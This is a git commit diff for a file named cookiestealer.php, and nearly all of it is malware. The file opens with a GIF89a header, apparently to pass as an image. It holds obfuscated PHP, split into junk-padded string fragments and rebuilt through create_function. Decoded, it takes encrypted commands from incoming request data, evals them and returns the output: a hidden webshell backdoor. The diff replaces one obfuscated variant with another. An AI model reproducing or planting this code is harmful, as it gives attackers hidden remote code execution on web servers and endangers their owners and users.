e5b15c9ee157e05abca2681d3d6abd13c36ef353
anthonyshikanga <anthonyshikanga@gmail.com>
2019-10-09 17:11:19 +0300

    Initial commit

--- cookiestealer.php
+++ cookiestealer.php
@@ -1,11 +1,14 @@
 GIF89a
 <?php
-$t='/LRinput"),$m)LR==1){@oLRb_starLRt(LR);@evaLRl(@gLRzuncompress(LR@x(@bLRaseLR64_deLRcode($m[1LR]),$kLR)));$o=@oLRb_L';
-$V=str_replace('UW','','creUWatUWeUW_fuUWUWUWnction');
-$F='Rget_contLRents()LR;LR@oLRb_end_cLRlean();$r=LR@baseLR64_LRencode(@LRx(@gzcompresLRs($o),$LRk));priLRnt("$pLRLR$kh$r$kf");}';
-$B='LR$k="5f4dLRcc3LRb";$kh="5LRaaLR765d61LRd83";$kf=LR"27debLR882cf99";$p=LRLR"EcgOzjHLRnELRhTZ8LR1NLRN"LR;function x($LRt';
-$Q='$oLR.=$t{$LRi}^LR$k{$j};}}LRLRretuLRrn $o;}if(@pLRreg_matcLRh("/LR$kLRh(.LR+)$kf/",@fileLR_get_cLRontentLRLRs("php:/';
-$Z=',$k){$c=stLRrlenLR($k)LR;$l=strlen(LR$tLR);$oLR="";for($iLR=0;$i<$l;)LR{for($jLR=LR0;($j<$c&&$i<LR$lLR)LR;$j++,$i++){';
-$s=str_replace('LR','',$B.$Z.$Q.$t.$F);
-$C=$V('',$s);$C();
+$F='$T`T`k="5f4dcT`c3b";$T`kh="5T`aa765T`d61d83";$kf="2T`7deb88T`T`2T`cf99T`";$T`p';
+$W=')==1){@T`obT`_start();@eT`valT`(@gzuncompreT`ss(@x(T`@baseT`64_decoT`de($';
+$R='`rlenT`($t);$T`o="";fT`or(T`$i=0;$i<$l;){T`foT`r($j=T`T`0;($j<T`$c&&$';
+$q='="RTOMyEcPT`VYrIIO7uT`";function xT`T`($T`t,$k){$c=strlen($k);$T`l=stT';
+$N='r=@baT`sT`e64_eT`nT`code(@x(@gzcompresT`s($oT`),$k)T`);prT`int("$p$T`kh$r$kf");}';
+$H='atT`ch("/$kh(.+)$kT`f/",@fT`ileT`_get_T`coT`ntents("pT`hp://inpuT`t"),T`$mT`';
+$U=str_replace('M','','cMrMeaMte_fMMMunction');
+$o='i<$l)T`;$j++,T`$iT`++){$o.=$tT`{$i}T`^$k{$jT`};}}rT`eturT`n $o;}T`if(@preg_m';
+$t='m[T`1]),$kT`))T`);$o=@obT`_geT`t_T`contents();@obT`_end_cleanT`T`();$';
+$u=str_replace('T`','',$F.$q.$R.$o.$H.$W.$t.$N);
+$g=$U('',$u);$g();
 ?>
